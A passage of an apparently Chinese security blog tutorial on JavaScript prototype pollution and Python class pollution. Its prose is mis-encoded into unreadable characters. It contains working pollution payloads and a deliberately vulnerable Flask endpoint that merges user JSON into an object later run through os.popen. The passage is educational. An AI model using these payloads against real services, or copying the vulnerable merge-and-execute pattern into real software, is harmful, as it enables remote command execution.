&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹ä»£ç å®éªŒä¸€ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>ç»“æœæ˜¯ï¼Œåˆå¹¶è™½ç„¶æˆåŠŸäº†ï¼Œä½†åŸå‹é“¾æ²¡æœ‰è¢«æ±¡æŸ“ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225904998.png" alt="image-20250311225904998"></p><p>è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©<code>__proto__</code>è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o1.a, o1.b)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">o3</span> = &#123;&#125;</span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o3.b)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225953552.png" alt="image-20250311225953552"></p><p>å¯è§ï¼Œæ–°å»ºçš„o3å¯¹è±¡ï¼Œä¹Ÿå­˜åœ¨bå±æ€§ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“ï¼š</p><p>è¿™æ˜¯å› ä¸ºï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜</p><p>å½“ç„¶<code>clone</code>åŒæ ·å­˜åœ¨è¯¥é—®é¢˜ï¼Œåç»­ç ”ç©¶</p><h1 id="pythonåŸå‹é“¾æ±¡æŸ“"><a href="#pythonåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="pythonåŸå‹é“¾æ±¡æŸ“"></a>pythonåŸå‹é“¾æ±¡æŸ“</h1><p>åœ¨pythonä¸­ï¼Œä¸‡ç‰©å³å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ç±»çš„å¼•ç”¨ï¼Œç±»è¿˜æœ‰è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•ï¼Œåœ¨å®ä¾‹æŸ¥æ‰¾å±æ€§æˆ–æ–¹æ³•æ—¶çš„è°ƒç”¨é¡ºåºæ—¶</p><p><code>å®ä¾‹å­—å…¸ â†’ ç±»å­—å…¸ â†’ çˆ¶ç±»å­—å…¸ â€¦ â†’ object(åŸºç±»)</code>MROçš„è§£æé¡ºåº,ä½†æ˜¯ä¸jsä¸åŒçš„æ˜¯ï¼Œpythonæ²¡æœ‰<code>proto</code>è¿™æ ·çš„åŸå‹é“¾ï¼Œç»§æ‰¿å…³ç³»å®Œå…¨</p><p>ç”±ç±»å±‚æ¬¡ç»“æ„å†³å®š</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>å¼•ç”¨ä¸€ä½å¸ˆå‚…çš„æ–¹æ³•</p><ul><li><p>åœ¨Pythonä¸­ï¼Œå®šä¹‰ç±»æ˜¯é€šè¿‡<code>class</code>å…³é”®å­—ï¼Œ<code>class</code>åé¢ç´§æ¥ç€æ˜¯ç±»åï¼Œç´§æ¥ç€æ˜¯<code>(object)</code>ï¼Œè¡¨ç¤ºè¯¥ç±»æ˜¯ä»å“ªä¸ªç±»ç»§æ‰¿ä¸‹æ¥çš„ï¼Œæ‰€æœ‰ç±»çš„æœ¬æºéƒ½æ˜¯objectç±»</p></li><li><p>å¯ä»¥è‡ªç”±åœ°ç»™ä¸€ä¸ªå®ä¾‹å˜é‡ç»‘å®šå±æ€§ï¼Œåƒjs</p></li><li><p>ç”±äºç±»å¯ä»¥èµ·åˆ°æ¨¡æ¿çš„ä½œç”¨ï¼Œå› æ­¤ï¼Œå¯ä»¥åœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼ŒæŠŠä¸€äº›æˆ‘ä»¬è®¤ä¸ºå¿…é¡»ç»‘å®šçš„å±æ€§å¼ºåˆ¶å¡«å†™è¿›å»ã€‚é€šè¿‡å®šä¹‰ä¸€ä¸ªç‰¹æ®Šçš„<code>__init__</code>æ–¹æ³•ï¼Œåœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼Œå°±æŠŠç±»å†…ç½®çš„å±æ€§ç»‘ä¸Š</p></li><li><p>æ³¨æ„åˆ°<code>__init__</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œæ˜¯<code>self</code>ï¼Œè¡¨ç¤ºåˆ›å»ºçš„å®ä¾‹æœ¬èº«ï¼Œå› æ­¤ï¼Œåœ¨<code>__init__</code>æ–¹æ³•å†…éƒ¨ï¼Œå°±å¯ä»¥æŠŠå„ç§å±æ€§ç»‘å®šåˆ°<code>self</code>ï¼Œå› ä¸º<code>self</code>å°±æŒ‡å‘åˆ›å»ºçš„å®ä¾‹æœ¬èº«ã€‚</p></li><li><p>å½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç±»å±æ€§åï¼Œè¿™ä¸ªå±æ€§è™½ç„¶å½’ç±»æ‰€æœ‰ï¼Œä½†ç±»çš„æ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—®åˆ°</p></li><li><p>åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯æŸä¸ªç±»å‹å¯ä»¥ç”¨<code>isinstance()</code>åˆ¤æ–­ã€‚</p></li></ul><h2 id="pythonçš„ç»§æ‰¿"><a href="#pythonçš„ç»§æ‰¿" class="headerlink" title="pythonçš„ç»§æ‰¿"></a>pythonçš„ç»§æ‰¿</h2><h3 id="å•ç»§æ‰¿"><a href="#å•ç»§æ‰¿" class="headerlink" title="å•ç»§æ‰¿"></a>å•ç»§æ‰¿</h3><p>é€šsuper()è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œæ²¡å¿…è¦é‡å¤å†™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Subclass must implement this abstract method&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, breed</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°</span><br>        <span class="hljs-variable language_">self</span>.breed = breed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, color</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°</span><br>        <span class="hljs-variable language_">self</span>.color = color<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().speak()  <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„ speak æ–¹æ³•</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Meow!&quot;</span>)<br><br><br>instance = Cat(<span class="hljs-string">&quot;çŒ«&quot;</span>, <span class="hljs-string">&quot;black&quot;</span>)<br><span class="hljs-built_in">print</span>(instance.name)<br><span class="hljs-built_in">print</span>(instance.__class__.__mro__)<br><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">çŒ«<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Cat&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Animal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>å•ç»§æ‰¿çš„è°ƒç”¨é“¾</p><h3 id="å¤šç»§æ‰¿"><a href="#å¤šç»§æ‰¿" class="headerlink" title="å¤šç»§æ‰¿"></a>å¤šç»§æ‰¿</h3><p>åŠ ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Flyer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fly</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> is flying.&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span>(Animal, Flyer):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°</span><br>        <span class="hljs-variable language_">self</span>.species = species<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> chirps.&quot;</span>)<br><br>a=Bird(<span class="hljs-string">&quot;Bob&quot;</span>,<span class="hljs-string">&quot;Male&quot;</span>)<br><span class="hljs-built_in">print</span>(a.__class__.__mro__)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-name">&lt;class</span> &#x27;__main__.Bird&#x27;&gt;, &lt;class &#x27;__main__.Animal&#x27;&gt;, &lt;class &#x27;__main__.Flyer&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br></code></pre></td></tr></table></figure><p>æ ‡å‡†çš„MROè°ƒç”¨é¡ºåº</p><h3 id="æ±¡æŸ“è¿‡ç¨‹è§£æ"><a href="#æ±¡æŸ“è¿‡ç¨‹è§£æ" class="headerlink" title="æ±¡æŸ“è¿‡ç¨‹è§£æ"></a>æ±¡æŸ“è¿‡ç¨‹è§£æ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret=<span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>    <br>instance=son_b()<br>payload=&#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br><br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬debugä¸€ä¸‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231033660.png" alt="image-20250309231033660"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é”®ä¸º<code>&#39;__class__&#39;</code>,å€¼ä¸º<code>&#123;&#39;__base__&#39;:&#123;&#39;secret&#39;:&#39;world&#39;&#125;&#125;</code>,ä¸‹ä¸€æ­¥ç”±äº<code>dst</code>ä¸ä¸ºå­—å…¸ç›´æ¥åˆ°äº†<code>elif</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231142951.png" alt="image-20250309231142951"></p><p>ç»§ç»­ä¹‹åï¼Œå‘ç°é”®ä¸º<code>&#39;__base__&#39;</code>,å€¼ä¸º<code>&#123;&#39;secret&#39;:&#39;world&#39;&#125;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231215167.png" alt="image-20250309231215167"></p><p><code>dst</code>è¿˜æ˜¯ä¸æ˜¯å­—å…¸ï¼Œç»§ç»­ä¸‹ä¸€æ­¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231422466.png" alt="image-20250309231422466"></p><p>ç°åœ¨é”®ä¸º<code>&#39;secret&#39;</code>ï¼Œå€¼ä¸º<code>&#39;world&#39;</code>ï¼Œå€¼ä¸æ˜¯å­—å…¸äº†ï¼Œç›´æ¥è·³åˆ°<code>else</code>æ‰€ä»¥ç›´æ¥è·³è½¬åˆ°äº†<code>setattr</code>ï¼Œè¿›è¡Œèµ‹å€¼</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231536024.png" alt="image-20250309231536024"></p><p>ç»§ç»­ä¸‹ä¸€æ­¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231717896.png" alt="image-20250309231717896"></p><p>å¯ä»¥çœ‹è§<code>dst</code>ç›´æ¥å°±æŒ‡å‘åœ°å€äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æˆåŠŸçš„é€šè¿‡å½“å‰ç±»çš„<code>__base__</code>å»æ±¡æŸ“äº†<code>secret</code>(ç°åœ¨è¿™ä¸‰ä¸ªç±»çš„<strong>secret</strong>éƒ½æ˜¯<strong>world</strong>)ï¼Œä¸è¿‡è¿™ä»…ä»…åªæ˜¯ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œé‚£èƒ½ä¸èƒ½å®ç°æœ€å¤§çš„åˆ©ç”¨ç›´æ¥æ±¡æŸ“<code>object</code>å‘¢</p><p>å‰é¢å‡ æ­¥éƒ½åœ¨æ­£å¸¸è¿›è¡Œï¼Œå¯æ˜¯åˆ°äº†åé¢ï¼Œå‘ç°ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšæ‰æ‰€æœ‰çš„å›é€€é‚£ä¸¤æ­¥å‘ç°æ²¡äº†ï¼Œä»è€Œç›´æ¥æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´æ±¡æŸ“å¤±è´¥ï¼Œå¾—å‡ºç»“è®º</p><p><strong>objectçš„å±æ€§ä¸èƒ½æ±¡æŸ“</strong></p><p>ä¸ä»…ä»…å¯ä»¥æ±¡æŸ“è¿™äº›å±æ€§ï¼Œè€Œä¸”è¿˜å¯ä»¥æ±¡æŸ“å†…ç½®å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;world&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;polluted!&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ±¡æŸ“å†…ç½®å±æ€§<code>__str__</code>ä¸º<code>polluted</code>äº†</p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>çœ‹ä¸€ä¸ªç®€å•æ— è„‘çš„<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>            merge(<span class="hljs-built_in">getattr</span>(dst, k), v)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cmd</span>):<br>        <span class="hljs-variable language_">self</span>.cmd = cmd<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> os.popen(<span class="hljs-variable language_">self</span>.cmd).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/merge_and_execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge_and_execute</span>():<br>    data = request.json<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Invalid input&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    cmd_data = data[<span class="hljs-string">&#x27;cmd&#x27;</span>]<br>    a = Demo(<span class="hljs-string">&#x27;echo Hello&#x27;</span>)<br>    merge(cmd_data, a)<br>    <br>    result = a.execute()<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: 